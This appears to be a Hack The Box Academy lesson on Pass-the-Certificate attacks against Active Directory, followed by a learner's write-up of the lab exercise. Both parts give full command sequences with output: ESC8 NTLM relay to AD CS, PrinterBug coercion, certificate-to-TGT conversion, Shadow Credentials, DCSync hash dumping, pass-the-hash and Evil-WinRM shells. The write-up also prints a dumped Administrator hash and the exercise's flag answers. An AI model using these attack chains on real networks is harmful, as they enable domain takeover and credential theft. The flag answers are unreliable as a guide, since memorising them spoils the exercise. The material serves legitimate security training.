[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. `Pass-the-Certificate` refers to the technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)`. This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

## AD CS NTLM Relay Attack (ESC8)

**Note:** Attacks against Active Directory Certificate Services are covered in great depth in the [ADCS Attacks](https://academy.hackthebox.com/module/details/236) module.

`ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:

![Microsoft Active Directory Certificate Services webpage for inlanefreight-CA01-CA. Options to request a certificate, view pending requests, or download a certificate chain or CRL.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/PtC_1.png)

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:

```
snchh337@htb$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

**Note:** The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running. The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:

```
snchh337@htb$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```
Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for `DC01$`:
```Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[*] HTTP server returned error code 404, treating as a successful login
[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[-] Authenticating against http://10.129.234.110 as / FAILED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:

```
snchh337@htb$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
snchh337@htb$ python3 -m venv .venv
snchh337@htb$ source .venv/bin/activate
snchh337@htb$ pip3 install -r requirements.txt
```

Then, we can begin the attack.

**Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

```
snchh337@htb$ pip3 install -I git+https://github.com/wbond/oscrypto.git
Defaulting to user installation because normal site-packages is not writeable
Collecting git+https://github.com/wbond/oscrypto.git
<SNIP>
Successfully built oscrypto
Installing collected packages: asn1crypto, oscrypto
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

```
snchh337@htb$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

2025-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
INFO:minikerberos:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

```
snchh337@htb$ export KRB5CCNAME=/tmp/dc.ccache
snchh337@htb$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
<SNIP>
```

## Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

![Diagram showing a connection between two users, wwhite@inlanefreight.locall and jpinkman@inlanefreight.locall, labeled "AddKeyCredentialLink."](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/PtC_2.png)

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:

```
snchh337@htb$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

In the output above, we can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

```
snchh337@htb$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
INFO:minikerberos:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

With the TGT obtained, we may once again `pass the ticket`:

```
snchh337@htb$ export KRB5CCNAME=/tmp/jpinkman.ccache
snchh337@htb$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```
In this case, we discovered that the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

```
snchh337@htb$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
inlanefreight\jpinkman
```

## No PKINIT?

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).


### Exercise

The targets were:

- _10.129.18.92 => Domain Controller_
- _10.129.18.93 => Certificate Authority_

We were provided valid credentials for:

- _User: wwhite_
- _Password: package5shores_topher1_

From there, everything escalated.

## Question 1: What are the contents of flag.txt on jpinkman’s desktop?

The attack began by abusing AD CS web enrollment through ESC8, which is an NTLM relay attack targeting the HTTP certificate enrollment endpoint.

The CA server exposes:

```
http://10.129.18.93/certsrv/certfnsh.asp
```

I launched ntlmrelayx to relay NTLM authentication to the AD CS endpoint and request a certificate using the KerberosAuthentication template.

```
impacket-ntlmrelayx \  
-t http://10.129.18.93/certsrv/certfnsh.asp \  
--adcs \  
--smb2support \  
--template KerberosAuthentication
```

After starting the relay listener, I coerced the Domain Controller to authenticate to my attacker machine using the PrinterBug technique:

```
python3 printerbug.py \  
INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.18.92 \  
10.10.14.250
```

Once the DC authenticated, ntlmrelayx successfully relayed the request and issued a certificate for the machine account:

```
GOT CERTIFICATE!  
Writing PKCS#12 certificate to ./DC01$.pfx
```

At this point I had a valid certificate for dc01$.

### Converting the Certificate into a Kerberos TGT

Using PKINITtools, I converted the certificate into a Kerberos Ticket Granting Ticket.

```
python3 gettgtpkinit.py \  
-cert-pfx /home/htb-ac-1966844/DC01$.pfx \  
-dc-ip 10.129.18.92 \  
INLANEFREIGHT.LOCAL/dc01$ \  
/tmp/dc.ccache
```

After successfully saving the TGT, I exported it:

```
export KRB5CCNAME=/tmp/dc.ccache
```

At this stage I effectively performed Pass-the-Certificate, which resulted in Pass-the-Ticket as the Domain Controller machine account.


To read user flags, I also needed access as jpinkman. Earlier in the module, I leveraged Shadow Credentials using msDS-KeyCredentialLink to generate a certificate for jpinkman and obtain a TGT for that account. Once that TGT was exported, I used Evil-WinRM over Kerberos:

```
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

Inside the shell:

```
cd C:\Users\jpinkman\Desktop  
type flag.txt
```

That returned:

```
3d7e3dfb56b200ef715cfc300f07f3f8
```

## Question 2 What are the contents of flag.txt on Administrator’s desktop?

Once I had a TGT as dc01$, I escalated further using DCSync to retrieve the Administrator account’s NTLM hash.

The correct syntax required Kerberos authentication and proper SPN handling:

```
export KRB5CCNAME=/tmp/dc.ccache

impacket-secretsdump \  
-k -no-pass \  
-just-dc-user Administrator \  
-dc-ip 10.129.18.92 \  
INLANEFREIGHT.LOCAL/dc01\$@dc01.inlanefreight.local
```

This successfully dumped:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
```

The NTLM hash was:

```
fd02e525dd676fd8ca04e200d265f20c
```

With the Administrator hash, I performed Pass-the-Hash using Evil-WinRM:

```
evil-winrm -i 10.129.18.92 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```

Once authenticated as Administrator:

```
cd C:\Users\Administrator\Desktop  
type flag.txt
```

This returned:

a1fc497a8433f5a1b4c18274019a2cdb